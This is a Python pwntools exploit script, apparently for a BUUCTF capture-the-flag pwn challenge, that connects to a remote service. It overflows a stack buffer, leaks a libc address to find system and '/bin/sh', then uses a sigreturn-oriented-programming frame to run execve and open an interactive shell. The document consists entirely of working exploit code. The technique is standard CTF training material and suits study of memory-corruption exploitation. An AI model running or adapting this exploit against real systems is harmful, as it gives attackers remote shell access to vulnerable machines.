from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28675)

write = 0x400503
read_write = 0x4004ed
poprdi_ret = 0x4005a3
poprsir15_ret = 0x4005a1
movrax3b_ret = 0x4004e2
movrax0f_ret = 0x4004da
syscall = 0x400517

payload = cyclic(0x10)
payload += p64(write)
payload += p64(write)
payload += p64(read_write)

io.sendline(payload)

libc_start_main = u64(io.recv()[-8:]) - 231
print(hex(libc_start_main))
libc = LibcSearcher('__libc_start_main', libc_start_main)
base = libc_start_main - libc.dump('__libc_start_main')

sys = base + libc.dump('system')
print(hex(sys - libc_start_main))
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x10)
payload += p64(movrax0f_ret)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
print(frame.__str__())

payload += flat(frame)

io.sendline(payload)

io.interactive()